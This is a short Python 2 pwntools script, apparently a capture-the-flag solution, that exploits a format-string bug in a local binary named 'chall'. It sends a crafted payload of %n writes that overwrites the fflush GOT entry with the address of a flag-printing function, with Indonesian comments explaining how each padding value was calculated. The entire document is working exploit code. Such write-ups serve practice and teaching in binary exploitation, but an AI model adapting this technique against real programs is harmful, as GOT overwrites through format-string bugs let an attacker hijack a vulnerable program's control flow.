#!/usr/bin/python2
from pwn import *

p = process('./chall')
binary = ELF('./chall')

# gdb.attach(p,'''
# b*main+184 #tempat vuln
# ''')

flag = p32(0x0804870b)

fflush_addr1 = p32(0x804a028) #fflush+0
fflush_addr2 = p32(0x804a029) #fflush+1
fflush_addr3 = p32(0x804a02b) #fflush+3 #kalo pake +2 ga mau address flagnya

fmt_string1 = "%10$n"
fmt_string2 = "%11$n"
fmt_string3 = "%12$n"

flag_val1 = "%185x" #biar 0b
flag_val2 = "%892x" #biar 0487 -> cara dapetinnya 0487 - 010b -> x/2xw 0x804a028
flag_val3 = "%129x" #biar 0x08 -> cara dapetinnya (0x100 - 0x87) + 0x8


payload = fflush_addr1 + fflush_addr2 + fflush_addr3 + flag_val1 + fmt_string1 + flag_val2 + fmt_string2 + flag_val3 + fmt_string3

p.sendline(payload)
p.interactive()